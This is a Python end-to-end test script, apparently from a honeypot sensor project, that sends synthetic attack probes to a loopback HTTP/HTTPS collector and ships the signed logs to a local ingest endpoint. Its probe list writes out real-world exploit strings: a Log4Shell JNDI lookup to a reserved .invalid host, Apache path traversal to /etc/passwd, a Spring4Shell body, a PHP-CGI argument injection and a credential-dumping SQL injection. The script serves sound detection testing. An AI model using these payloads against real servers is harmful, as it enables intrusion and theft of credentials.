"""Sensor half of the local E2E signature -> CVE pipeline test.

Runs the real HTTP collector on an ephemeral loopback port, sends fixed
synthetic probes to it, then lets the real shipper spool, sign (HMAC), and
deliver the collector's JSONL to a loopback ingest URL supplied by the Node
test. Nothing leaves 127.0.0.1, no payload is executed, and every callback
host uses the reserved .invalid TLD.

Usage (driven by tests/e2e/signature-pipeline.test.ts):
    ATTACKARIUM_E2E_HMAC_SECRET=... python3 sensor_pipeline.py \
        --ingest-url http://127.0.0.1:<port>/ingest --sensor-id <id> --workdir <dir>

Prints one JSON summary line to stdout.
"""

from __future__ import annotations

import argparse
import http.client
import json
import os
import ssl
import subprocess
import sys
import threading
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO_ROOT / "sensors" / "http-collector"))
sys.path.insert(0, str(REPO_ROOT / "sensors" / "shipper"))

from collector import CollectorConfig, create_server  # noqa: E402
from shipper import EventShipper, ShipperConfig  # noqa: E402

# (label, method, path, headers, body). Keep in sync with EXPECTED in the Node test.
PROBES: list[tuple[str, str, str, dict[str, str], bytes | None]] = [
    (
        "log4shell_user_agent",
        "GET",
        "/",
        {"User-Agent": "${jndi:ldap://callback-e2e.invalid/a}"},
        None,
    ),
    (
        "apache_traversal",
        "GET",
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        {},
        None,
    ),
    (
        "spring4shell_body",
        "POST",
        "/app",
        {"Content-Type": "application/x-www-form-urlencoded"},
        b"class.module.classLoader.resources.context.parent.pipeline.first.pattern=x",
    ),
    (
        "php_cgi_soft_hyphen",
        "POST",
        "/cgi-bin/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
        {},
        b"<?php echo 1; ?>",
    ),
    (
        "sqli_technique_only",
        "GET",
        "/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
        {},
        None,
    ),
    ("sap_metadatauploader", "GET", "/developmentserver/metadatauploader", {}, None),
    ("dotenv_recon", "GET", "/.env", {}, None),
    ("mcp_discovery", "GET", "/mcp", {}, None),
    ("benign", "GET", "/index.html", {"User-Agent": "Mozilla/5.0"}, None),
]

# Sent to the TLS collector (#93): same rule catalog, reported as https/443.
HTTPS_PROBES: list[tuple[str, str, str, dict[str, str], bytes | None]] = [
    ("sap_metadatauploader_https", "GET", "/developmentserver/metadatauploader", {}, None),
]


def send_probes(port: int) -> None:
    for _label, method, path, headers, body in PROBES:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        try:
            conn.request(method, path, body=body, headers=headers)
            conn.getresponse().read()
        finally:
            conn.close()


def send_https_probes(port: int, cafile: Path) -> None:
    ctx = ssl.create_default_context(cafile=str(cafile))
    ctx.check_hostname = False  # connect by IP like a scanner; the chain is still verified
    for _label, method, path, headers, body in HTTPS_PROBES:
        conn = http.client.HTTPSConnection("127.0.0.1", port, timeout=5, context=ctx)
        try:
            conn.request(method, path, body=body, headers=headers)
            conn.getresponse().read()
        finally:
            conn.close()


def run_collector(config: CollectorConfig, send: Any) -> None:
    server = create_server(config)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        send(server.server_address[1])
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--ingest-url", required=True)
    parser.add_argument("--sensor-id", required=True)
    parser.add_argument("--workdir", required=True)
    args = parser.parse_args()

    secret = os.environ.get("ATTACKARIUM_E2E_HMAC_SECRET", "")
    if len(secret) < 32:
        print("ATTACKARIUM_E2E_HMAC_SECRET must be set (>= 32 chars)", file=sys.stderr)
        return 2

    workdir = Path(args.workdir)
    jsonl_path = workdir / "http-collector.jsonl"

    https_jsonl_path = workdir / "https-collector.jsonl"
    tls_dir = workdir / "tls"
    subprocess.run(
        ["bash", str(REPO_ROOT / "sensors" / "http-collector" / "generate_tls_cert.sh"), "--dir", str(tls_dir)],
        check=True,
        capture_output=True,
    )

    run_collector(
        CollectorConfig(
            host="127.0.0.1",
            port=0,
            protocol_label="http",
            reported_dst_port=80,
            output_jsonl=jsonl_path,
            max_body_bytes=256,
        ),
        send_probes,
    )
    run_collector(
        CollectorConfig(
            host="127.0.0.1",
            port=0,
            protocol_label="https",
            reported_dst_port=443,
            output_jsonl=https_jsonl_path,
            max_body_bytes=256,
            tls_cert_path=tls_dir / "cert.pem",
            tls_key_path=tls_dir / "key.pem",
        ),
        lambda port: send_https_probes(port, tls_dir / "cert.pem"),
    )

    http_lines = jsonl_path.read_text(encoding="utf-8").splitlines()
    https_lines = https_jsonl_path.read_text(encoding="utf-8").splitlines()
    lines = http_lines + https_lines
    all_probes = PROBES + HTTPS_PROBES
    # Probes are sent sequentially, so JSONL order matches probe order.
    probe_event_ids = {
        label: json.loads(line)["id"] for (label, *_), line in zip(all_probes, lines)
    }

    shipper = EventShipper(
        ShipperConfig(
            sensor_id=args.sensor_id,
            hmac_secret=secret,
            ingest_url=args.ingest_url,
            spool_path=workdir / "spool.sqlite3",
            heartbeat_interval_seconds=0,
        )
    )
    try:
        spooled = shipper.ingest_jsonl_lines(lines)
        flushes = 0
        while shipper.spool.count() > 0 and flushes < 10:
            if not shipper.flush_once():
                break
            flushes += 1
        remaining = shipper.spool.count()
        last_error = shipper.metrics.last_error
    finally:
        shipper.close()

    print(
        json.dumps(
            {
                "collector_records": len(lines),
                "spooled": spooled,
                "remaining": remaining,
                "last_error": last_error,
                "probe_labels": [label for label, *_ in all_probes],
                "probe_event_ids": probe_event_ids,
            }
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
